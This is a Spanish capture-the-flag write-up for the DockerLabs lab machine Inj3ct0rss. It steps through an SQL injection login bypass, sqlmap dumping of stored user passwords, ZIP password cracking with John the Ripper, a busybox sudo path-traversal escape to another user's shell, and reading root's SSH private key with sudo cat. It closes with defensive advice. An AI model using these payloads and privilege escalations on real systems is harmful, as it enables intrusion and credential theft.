# Inj3ct0rss — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 18/08/2024  
**Técnicas:** SQL Injection · SQLMap · ZIP Cracking · JohnTheRipper · SSH · sudo busybox abuse · sudo cat abuse · Private Key Disclosure

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web y SQL Injection](#2-enumeración-web-y-sql-injection)
3. [Explotación SQLMap](#3-explotación-sqlmap)
4. [Cracking del ZIP protegido](#4-cracking-del-zip-protegido)
5. [Acceso SSH — usuario ralf](#5-acceso-ssh--usuario-ralf)
6. [Escalada horizontal — usuario capa](#6-escalada-horizontal--usuario-capa)
7. [Escalada final a root](#7-escalada-final-a-root)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh inj3ct0rss.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
OpenSSH
Inj3ct0rs CTF - pUxC3/xA1g1na Principal
```

---

## 2. Enumeración web y SQL Injection

Accedemos al servidor web y exploramos la aplicación.

Encontramos un panel de login vulnerable a SQL Injection.

Payload utilizado:

```sql
' OR 1=1-- -
```

Resultado:

```text
Acceso como administrador
```

Una vez autenticados no encontramos información relevante inicialmente.

---

## 3. Explotación SQLMap

Utilizamos SQLMap para automatizar la explotación SQLi:

```bash
sqlmap -u http://172.17.0.2/login.php --forms --dbs --batch
```

Resultado:

```text
information_schema
injectors_db
mysql
performance_schema
sys
```

Enumeramos tablas:

```bash
sqlmap -u http://172.17.0.2/login.php \
--forms -D injectors_db --tables --batch
```

Resultado:

```text
users
```

Enumeramos columnas:

```bash
sqlmap -u http://172.17.0.2/login.php \
--forms -D injectors_db -T users --columns --batch
```

Resultado:

```text
id
password
username
```

Extraemos datos:

```bash
sqlmap -u http://172.17.0.2/login.php \
--forms -D injectors_db -T users \
-C id,password,username --dump --batch
```

Resultado:

```text
root : loveyou
jane : chicago123
admin : password
ralf : no_mirar_en_este_directorio
```

---

## 4. Cracking del ZIP protegido

Exploramos el directorio encontrado:

```text
http://172.17.0.2/no_mirar_en_este_directorio
```

Encontramos:

```text
secret.zip
```

Descargamos el archivo:

```bash
wget http://172.17.0.2/no_mirar_en_este_directorio/secret.zip
```

Intentamos extraerlo:

```bash
unzip secret.zip
```

Resultado:

```text
incorrect password
```

Generamos el hash:

```bash
zip2john secret.zip > password.hash
```

Crackeamos con JohnTheRipper:

```bash
john password.hash
```

Resultado:

```text
letmein
```

Extraemos el contenido:

```bash
unzip secret.zip
```

Contraseña:

```text
letmein
```

Archivo obtenido:

```text
confidencial.txt
```

Contenido:

```text
ralf:supersecurepassword
```

---

## 5. Acceso SSH — usuario ralf

Accedemos mediante SSH:

```bash
ssh ralf@172.17.0.2
```

Contraseña:

```text
supersecurepassword
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
```

Consultamos GTFOBins para `busybox`.

Payload utilizado:

```bash
sudo -u capa /usr/local/bin/busybox /nothing/../../bin/sh
```

Verificamos usuario:

```bash
whoami
capa
```

---

## 6. Escalada horizontal — usuario capa

Exploramos el directorio personal:

```bash
cd /home/capa
ls
```

Resultado:

```text
passwd.txt
```

Leemos el archivo:

```bash
cat passwd.txt
```

Resultado:

```text
capa:capaelmejor
```

Accedemos mediante SSH:

```bash
ssh capa@172.17.0.2
```

Contraseña:

```text
capaelmejor
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(ALL : ALL) NOPASSWD: /bin/cat
```

---

## 7. Escalada final a root

Aprovechamos `cat` para leer la clave privada de root:

```bash
sudo /bin/cat /root/.ssh/id_rsa
```

Copiamos el contenido en nuestro host:

```bash
nano id_rsa
```

Asignamos permisos correctos:

```bash
chmod 600 id_rsa
```

Accedemos como root mediante SSH:

```bash
ssh -i id_rsa root@172.17.0.2
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| SQL Injection | Extracción de información sensible |
| Contraseñas débiles | Acceso inicial |
| ZIP protegido con contraseña débil | Filtración de credenciales |
| busybox ejecutable con sudo | Escalada horizontal |
| sudo sobre cat | Lectura de archivos críticos |
| Exposición de clave privada root | Compromiso total del sistema |

**Para defenderse:**

- Validar correctamente entradas SQL.
- Aplicar políticas robustas de contraseñas.
- No almacenar secretos en directorios accesibles.
- Restringir binarios peligrosos mediante sudo.
- Proteger claves privadas SSH adecuadamente.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
